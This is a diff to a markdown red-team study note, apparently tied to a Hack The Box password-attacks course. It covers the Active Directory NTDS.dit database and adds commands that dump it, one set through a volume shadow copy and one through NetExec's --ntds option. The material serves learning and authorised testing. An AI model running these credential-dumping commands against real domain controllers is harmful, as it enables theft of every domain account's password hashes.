@@ -26,9 +26,24 @@
 
 [![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
-Active directory database is stored on the domain controller at `%SystemRoot%\ntds.dit`. It's used to validate credentials.
+Active directory database is stored on the domain controller at `%SystemRoot%\ntds\ntds.dit`. It's used to validate credentials.
 
-It contains user/computer/group accounts, group policies, etc. 
+It contains user/computer/group accounts, group policies, etc.
+
+To copy this database, we either need local administrative or domain administrative privileges. We can use [VSS](/operating-systems/windows/security/index.md#volume-shadow-copy-service-vss).
+
+You can use commands that are only available on Windows Server:
+
+```shell!
+CMD> vssadmin CREATE SHADOW /For=C:
+CMD> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit %temp%\NTDS.dit
+```
+
+You can also use [cme](/cybersecurity/red-team/tools/cracking/auth/cme.md)/[nxc](/cybersecurity/red-team/tools/cracking/auth/cme.md) which automatically dump it:
+
+```ps
+$ nxc smb IP -u 'username' -p 'password' --ntds
+```
 </div><div>
 
 #### Kerberos
